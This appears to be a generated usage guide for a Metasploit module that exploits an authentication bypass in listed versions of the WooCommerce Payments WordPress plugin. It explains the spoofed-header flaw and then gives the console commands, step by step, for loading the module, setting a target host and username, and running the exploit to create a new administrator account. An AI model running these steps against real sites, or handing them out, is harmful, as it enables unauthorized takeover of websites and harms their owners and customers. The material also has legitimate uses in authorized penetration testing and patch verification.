**The description of current metasploit exploit**
WooCommerce-Payments plugin for Wordpress versions 4.8', '4.8.2, 4.9', '4.9.1,          5.0', '5.0.4, 5.1', '5.1.3, 5.2', '5.2.2, 5.3', '5.3.1, 5.4', '5.4.1,          5.5', '5.5.2, and 5.6', '5.6.2 contain an authentication bypass by specifying a valid user ID number          within the X-WCPAY-PLATFORM-CHECKOUT-USER header. With this authentication bypass, a user can then use the API          to create a new user with administrative privileges on the target WordPress site IF the user ID          selected corresponds to an administrator account.

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/http/wp_woocommerce_payments_add_user
```

Then set the required options:

```bash
# Required parameters with no default value
set RHOSTS <your target host(s) here>
set USERNAME <your user to create here>
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 80 - The target port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.